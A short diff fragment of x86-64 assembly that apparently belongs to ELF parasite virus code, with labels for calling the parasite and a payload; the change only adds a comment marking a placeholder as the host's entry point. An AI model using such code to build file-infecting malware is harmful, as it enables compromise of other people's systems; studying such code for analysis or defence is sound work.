@@ -43,7 +43,7 @@ _start:
 .call_parasite:
 	call r8
 
-	mov r8, 0x3333333333333333
+	mov r8, 0x3333333333333333  ; code entry point address
 	call isso
 	cmp rax, 0
 	je .end_payload
